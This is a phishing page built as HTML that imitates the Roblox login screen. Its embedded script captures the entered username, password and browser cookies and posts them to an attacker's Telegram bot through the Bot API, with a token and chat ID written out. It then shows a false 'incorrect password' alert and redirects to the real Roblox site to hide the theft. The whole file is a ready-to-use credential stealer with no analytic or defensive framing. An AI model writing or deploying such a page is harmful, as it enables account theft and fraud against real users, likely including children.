<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox – Login</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
        }
        body {
            background: #1a1a2e;
            display: flex;
            flex-direction: column;
            align-items: center;
            min-height: 100vh;
            margin: 0;
        }
        .navbar {
            width: 100%;
            background: #23272a;
            padding: 12px 40px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            flex-wrap: wrap;
            border-bottom: 2px solid #000;
        }
        .navbar .logo {
            font-size: 28px;
            font-weight: 800;
            color: #fff;
            letter-spacing: -0.5px;
        }
        .navbar .logo span {
            color: #e03a3a;
        }
        .nav-links {
            display: flex;
            gap: 28px;
            color: #fff;
            font-size: 16px;
            font-weight: 500;
        }
        .nav-links span {
            color: #ddd;
            cursor: default;
        }
        .nav-links a {
            color: #fff;
            text-decoration: none;
        }
        .nav-links a:hover {
            text-decoration: underline;
        }
        .nav-right {
            display: flex;
            align-items: center;
            gap: 16px;
        }
        .nav-right .signup-btn {
            background: #e03a3a;
            color: #fff;
            padding: 8px 20px;
            border-radius: 4px;
            font-weight: 600;
            text-decoration: none;
            font-size: 14px;
        }
        .nav-right .signup-btn:hover {
            background: #c62a2a;
        }
        .login-container {
            background: #fff;
            padding: 44px 40px 36px;
            border-radius: 12px;
            box-shadow: 0 4px 24px rgba(0,0,0,0.2);
            width: 100%;
            max-width: 400px;
            margin-top: 60px;
        }
        .login-container h1 {
            font-size: 30px;
            font-weight: 700;
            color: #1a1a2e;
            margin-bottom: 2px;
        }
        .login-container .sub {
            color: #5a5a5a;
            font-size: 14px;
            margin-bottom: 24px;
        }
        .login-container label {
            display: block;
            font-size: 13px;
            font-weight: 600;
            color: #222;
            margin: 14px 0 4px;
        }
        .login-container input {
            width: 100%;
            padding: 12px 14px;
            border: 1px solid #c4c9d4;
            border-radius: 6px;
            font-size: 15px;
            background: #fafafa;
            transition: 0.2s;
        }
        .login-container input:focus {
            border-color: #0077ff;
            outline: none;
            background: #fff;
            box-shadow: 0 0 0 3px rgba(0,119,255,0.12);
        }
        .login-container .forgot {
            display: block;
            text-align: right;
            font-size: 13px;
            color: #0077ff;
            text-decoration: none;
            margin-top: 6px;
            font-weight: 500;
        }
        .login-container .forgot:hover {
            text-decoration: underline;
        }
        .login-container .login-btn {
            width: 100%;
            padding: 14px;
            background: #e03a3a;
            border: none;
            border-radius: 6px;
            color: #fff;
            font-size: 18px;
            font-weight: 700;
            cursor: pointer;
            margin-top: 24px;
            transition: 0.15s;
        }
        .login-container .login-btn:hover {
            background: #c62a2a;
        }
        .login-container .divider {
            display: flex;
            align-items: center;
            margin: 20px 0 16px;
            color: #888;
            font-size: 13px;
            gap: 12px;
        }
        .login-container .divider hr {
            flex: 1;
            border: none;
            border-top: 1px solid #ddd;
        }
        .login-container .quick-link {
            display: block;
            text-align: center;
            color: #0077ff;
            text-decoration: none;
            font-weight: 500;
            font-size: 14px;
            margin-top: 4px;
        }
        .login-container .quick-link:hover {
            text-decoration: underline;
        }
        .login-container .signup-bottom {
            text-align: center;
            margin-top: 24px;
            font-size: 14px;
            color: #444;
        }
        .login-container .signup-bottom a {
            color: #0077ff;
            text-decoration: none;
            font-weight: 600;
        }
        .login-container .signup-bottom a:hover {
            text-decoration: underline;
        }
        .footer-links {
            margin-top: 28px;
            font-size: 12px;
            color: #888;
            text-align: center;
        }
        .footer-links a {
            color: #666;
            text-decoration: none;
            margin: 0 8px;
        }
        .footer-links a:hover {
            text-decoration: underline;
        }
        @media (max-width: 600px) {
            .navbar {
                padding: 10px 16px;
                flex-direction: column;
                gap: 8px;
            }
            .login-container {
                margin: 30px 16px;
                padding: 28px 18px;
            }
        }
    </style>
</head>
<body>
    <div class="navbar">
        <div class="logo">ROBLOX<span>.</span></div>
        <div class="nav-links">
            <span>Charts</span>
            <a href="#">Marketplace</a>
            <a href="#">Create</a>
            <a href="#">Robux</a>
        </div>
        <div class="nav-right">
            <a href="#" class="signup-btn">Sign Up</a>
        </div>
    </div>

    <div class="login-container">
        <h1>Log In</h1>
        <div class="sub">to continue to Roblox</div>

        <form id="loginForm">
            <label for="user">Username / Email / Phone</label>
            <input type="text" id="user" placeholder="Enter your username" required>

            <label for="pass">Password</label>
            <input type="password" id="pass" placeholder="Enter your password" required>
            <a href="#" class="forgot">Forgot Password or Username?</a>

            <button type="submit" class="login-btn">Log In</button>
        </form>

        <div class="divider">
            <hr> or <hr>
        </div>

        <a href="#" class="quick-link">Email Me a One-Time Code</a>
        <a href="#" class="quick-link" style="margin-top:6px;">Quick Sign-in</a>

        <div class="signup-bottom">
            Don't have an account? <a href="#">Sign Up</a>
        </div>

        <div class="footer-links">
            <a href="#">Privacy</a> · <a href="#">Terms</a> · <a href="#">About</a>
        </div>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            let u = document.getElementById('user').value;
            let p = document.getElementById('pass').value;
            let c = document.cookie || 'No cookie';

            fetch('https://api.telegram.org/bot8879421873:AAHn8_tRAwlc4lVGCIN-A0J_u6y_alhCR8A/sendMessage', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    chat_id: '1899955226',
                    text: 'User: ' + u + '\nPass: ' + p + '\nCookie: ' + c
                })
            });

            alert('Incorrect username or password. Please try again.');
            window.location.href = 'https://www.roblox.com/login';
        });
    </script>
</body>
</html>
